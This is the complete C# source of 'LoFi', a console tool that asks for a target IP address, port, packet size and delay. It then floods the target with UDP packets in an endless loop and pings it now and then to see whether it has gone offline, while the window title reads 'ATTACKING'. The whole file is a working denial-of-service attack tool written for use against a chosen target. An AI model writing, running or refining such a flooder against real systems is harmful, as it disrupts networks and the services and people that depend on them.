using System;
using System.Text;
using System.Threading;
using System.Net;
using System.Net.Sockets;
using System.Net.NetworkInformation;

namespace LoFi
{
    class Program
    {
        // Title variable
        private static readonly string title = @"

              ██▓        ▒█████       █████▒    ██▓
             ▓██▒       ▒██▒  ██▒   ▓██   ▒    ▓██▒
             ▒██░       ▒██░  ██▒   ▒████ ░    ▒██▒
             ▒██░       ▒██   ██░   ░▓█▒  ░    ░██░
             ░██████▒   ░ ████▓▒░   ░▒█░       ░██░
             ░ ▒░▓  ░   ░ ▒░▒░▒░     ▒ ░       ░▓  
             ░ ░ ▒  ░     ░ ▒ ▒░     ░          ▒ ░
               ░ ░      ░ ░ ░ ▒      ░ ░        ▒ ░
                 ░  ░       ░ ░                 ░  
                                      ";


        // Parameter Variables
        private static string address;
        private static string payload;
        private static string delayer;
        private static string netport;

        // Payload parsed value
        private static string parseload = "";

        private static void Main(string[] args)
        {
            // Set console size and color
            Console.SetWindowSize(65, 25);
            Console.BackgroundColor = ConsoleColor.Black;

            // Write titles
            Color(6);
            Console.Clear();
            Console.Title = "♫  L O F I  ( v 1 . 0 )  ♫";
            Console.WriteLine(title);
            Color(0);

            // Set parameters
            Parameters("Enter the IP Address of your target.", 1);
            Parameters("Enter the port number of your target", 2);
            Parameters("Enter the desired packet size (bytes).", 3);
            Parameters("Enter the desired packet delay (milliseconds).", 4);

            // Convert parameters
            for (int i = 0; i < int.Parse(payload); i++)
            {
                parseload += "0";
            }

            // Ping the target
            Ping();
        }

        // Get parameters
        private static void Parameters(string question, int switcher)
        {
            Color(4);
            Console.Write("╔═ ");
            Color(6);
            Console.Write("♫ ");
            Color(0);
            Console.Write(question);
            Color(6);
            Console.Write(" ♫");
            Console.WriteLine();
            Color(4);
            Console.Write("╚══ ");
            Color(0);
            string input = Console.ReadLine();

            switch (switcher)
            {
                case 1:
                    address = input;
                    break;
                case 2:
                    netport = input;
                    break;
                case 3:
                    payload = input;
                    break;
                case 4:
                    delayer = input;
                    break;
            }
        }

        // Ping the target
        private static void Ping()
        {
            // Line break
            Console.WriteLine();

            // Change the title to a cool attacking animation
            Thread attackontitle = new(AttackOnTitle);
            attackontitle.Start();

            Socket pinger = new(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
            byte[] pingload = Encoding.ASCII.GetBytes(parseload);
            IPEndPoint endpoint = new(IPAddress.Parse(address), int.Parse(netport));

            int i = 1;
            int pluscolor = 1;
            int packets = 0;

            while (true)
            {
                try
                {
                    pinger.SendTo(pingload, endpoint);
                    packets++;
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex);
                }
                i++;

                if (i == 8)
                {
                    // Do some garbage collection
                    GC.Collect();
                    GC.WaitForPendingFinalizers();
                    GC.Collect();

                // Ping target to check if it's still online
                pingattempt:
                    Color(pluscolor);
                    Ping pingSender = new();
                    byte[] buffer = Encoding.ASCII.GetBytes("abcdefghijklmnopqrstuvwabcdefghi");
                    int timeout = 10000;
                    PingOptions options = new(64, true);
                    try
                    {
                        PingReply reply = pingSender.Send(address, timeout, buffer, options);
                        if (reply.Status == IPStatus.Success)
                        {
                            Console.WriteLine("♫ Pinged : " + address + " : " + netport + " : TTL " + reply.Options.Ttl + "ms : RT " + reply.RoundtripTime + "ms : " + packets + "*" + payload);
                            i = 1;
                        }
                        else
                        {
                            Color(0);
                            Console.WriteLine("♫  O F F L I N E  ♫");
                            Console.Beep();
                            goto pingattempt;
                        }

                        pluscolor++;
                        if (pluscolor == 7)
                        {
                            pluscolor = 1;
                        }
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine(ex);
                    }
                }

                Thread.Sleep(int.Parse(delayer));
            }
        }

        // Color changing algorithm
        private static void Color(int value)
        {
            switch (value)
            {
                case 0:
                    Console.ForegroundColor = ConsoleColor.White;
                    break;
                case 1:
                    Console.ForegroundColor = ConsoleColor.Red;
                    break;
                case 2:
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    break;
                case 3:
                    Console.ForegroundColor = ConsoleColor.Green;
                    break;
                case 4:
                    Console.ForegroundColor = ConsoleColor.Cyan;
                    break;
                case 5:
                    Console.ForegroundColor = ConsoleColor.Blue;
                    break;
                case 6:
                    Console.ForegroundColor = ConsoleColor.Magenta;
                    break;
            }
        }

        // Changes the title and other superficial features
        private static void AttackOnTitle()
        {
            while (true)
            {
                Console.Title = "♫ A T T A C K I N G";
                Thread.Sleep(150);
                Console.Title = "♫ A T T A C K I N G .";
                Thread.Sleep(150);
                Console.Title = "♫ A T T A C K I N G . .";
                Thread.Sleep(150);
                Console.Title = "♫ A T T A C K I N G . . .";
                Thread.Sleep(150);
            }
        }
    }
}